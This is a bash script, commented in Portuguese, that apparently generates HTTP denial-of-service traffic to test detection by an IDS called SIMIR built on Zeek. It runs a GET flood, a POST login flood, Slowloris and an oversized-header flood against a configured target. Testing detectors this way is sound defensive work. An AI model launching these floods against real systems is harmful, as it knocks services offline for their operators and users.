#!/usr/bin/env bash
source /tmp/target.var

echo "[+] Starting HTTP DoS/DDoS Attack Simulation"
echo "[+] Target: http://${TARGET_WEB}"
echo ""

# Extrai apenas o IP/hostname sem http://
TARGET_HOST=$(echo ${TARGET_WEB} | sed 's/http:\/\///' | sed 's/https:\/\///' | cut -d'/' -f1)

# Ataque 1: Apache Bench - High Volume HTTP GET Flood
echo "[1/4] Apache Bench - High Volume HTTP GET Flood"
echo "      Sending 10000 requests with 200 concurrent connections..."
# Aumentado para garantir detecção (10k requests, 200 concurrent)
ab -n 10000 -c 200 -t 60 -k -r "http://${TARGET_WEB}/" > /dev/null 2>&1 &
AB_PID=$!

# Aguarda um pouco antes do próximo ataque
sleep 3

# Ataque 2: HTTP POST Flood - Simula formulários maliciosos
echo "[2/4] HTTP POST Flood - Malicious Form Submissions"
echo "      Sending 1000 POST requests..."
for i in $(seq 1 1000); do
    curl -X POST \
         -H "Content-Type: application/x-www-form-urlencoded" \
         -H "Connection: keep-alive" \
         -d "user=attacker&pass=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)" \
         --connect-timeout 2 --max-time 5 \
         "http://${TARGET_WEB}/login" > /dev/null 2>&1 &
    
    # Controla taxa mas mantém alta intensidade
    if [ $((i % 100)) -eq 0 ]; then
        sleep 0.5
    fi
done

sleep 3

# Ataque 3: Slowloris - Esgota conexões do servidor
echo "[3/4] Slowloris - Connection Exhaustion Attack"
echo "      Opening 200 slow connections to exhaust server resources..."
timeout 30s slowloris ${TARGET_HOST} -s 200 -t 60 > /dev/null 2>&1 &
SLOW_PID=$!

# Aguarda um pouco antes do próximo ataque
sleep 3

# Ataque 4: HTTP Header Flood - Requisições com headers gigantes
echo "[4/4] HTTP Header Flood - Large Header Attack"
echo "      Sending 500 requests with oversized headers..."
for i in $(seq 1 500); do
    RANDOM_HEADER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 2048 | head -n 1)
    curl -H "X-Custom-Header-$i: $RANDOM_HEADER" \
         -H "X-Forwarded-For: 1.2.3.4" \
         -H "User-Agent: Mozilla/5.0 (DoS-Test)" \
         -H "Connection: keep-alive" \
         --connect-timeout 2 --max-time 5 \
         "http://${TARGET_WEB}/" > /dev/null 2>&1 &
    
    if [ $((i % 50)) -eq 0 ]; then
        sleep 0.3
    fi
done

# Aguarda processos principais finalizarem
echo ""
echo "[+] Waiting for attacks to complete..."
wait $AB_PID 2>/dev/null
wait $SLOW_PID 2>/dev/null

# Aguarda processos em background
sleep 10

echo ""
echo "[+] DoS/DDoS HTTP Attack Simulation Completed"
echo "[+] Attack Summary:"
echo "    - Apache Bench: 10,000 requests (200 concurrent)"
echo "    - POST Flood: 1,000 POST requests"
echo "    - Slowloris: 200 slow connections (30s)"
echo "    - Header Flood: 500 requests with 2KB headers"
echo "[+] Total: ~12,000+ HTTP connections generated"
echo "[+] Attack duration: ~90 seconds"
echo ""
echo "[+] Expected SIMIR Detection:"
echo "    - DoS_Attack_Detected (>100 connections from single source)"
echo "    - Check: docker exec SIMIR_Z grep 'DoS\\|DDoS' /usr/local/zeek/spool/zeek/notice.log"   